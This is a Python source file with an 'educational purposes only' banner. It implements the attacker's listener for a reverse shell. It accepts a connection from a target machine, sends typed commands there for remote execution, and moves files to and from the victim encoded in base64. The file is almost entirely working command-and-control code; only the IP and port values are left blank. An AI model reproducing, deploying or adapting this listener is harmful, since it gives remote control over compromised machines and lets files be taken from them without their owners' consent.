import socket,json,subprocess,base64

##############################################################################
'''                                                                          #
                                                                             #
   This code is provided for educational purposes only. Do good. Be Ethical. #                                                                        
                                                                             #
'''                                                                          # 
##############################################################################

class listener:
    def __init__(self,IP,PORT): # constarctor 

        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR, 1) # when a connection is lost it will start a new one
        listener.bind((IP,PORT)) # server IP and PORT that devices connect to it
        
        listener.listen(0) # number of connections
        print("[+] watting for incoming connections")
        self.connection, address = listener.accept()
        print(f"[+] Got a connetion from {address[0]}:{address[1]}") # get the target connection

    def execute_remotely(self,command): # a function execute the command that recievd *from run function*  
        self.reliable_send(command) # send the command to the target machine
        
        if command[0] == "exit":
            print(f"[*] Close the connetion...")
            self.connection.close()
            exit()

        
        return self.reliable_recieve() # return the result of execution to *run function*
            
    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode("utf-8")) # enconding the data and sending it as bytes...
    
    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode("utf-8") # receiving the data and decoding it as a string.... 
                return json.loads(json_data)
            except ValueError:
                continue # continue the looping to receive the rest of the data
    
    def write_file(self,path,content): # write a file function
        
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful."
    
    def read_file(self,path): # read a file fucntion
        
        with open(path,"rb") as file: # rb (read as binary file)
           return base64.b64encode(file.read()).decode()
    
    def run(self):
        while True:
            command = input("Pentest(revrese_tcp)>> ") # enter a command from Attacker machine 
            command_parts = command.split(" ") # split the command into parts
            
            if command_parts[0] == "upload":
                if len(command_parts) > 1:
                    file_content = self.read_file(command_parts[1])
                    command_parts.append(file_content)
                else:
                    print("Usage: upload <local_file_path>")
                    continue

            result = self.execute_remotely(command_parts) # send the command to *execution function*
        
            if command_parts[0] == "download":
                result = self.write_file(command_parts[1], result) # second argument of the command is the path (command_parts[1])

            print(result) # print the result in Attacker machine terminal



IP = "" # IP of the listener 
PORT =  # PORT to start the connection 
 
MY_LISTENER = listener(IP,PORT)
MY_LISTENER.run()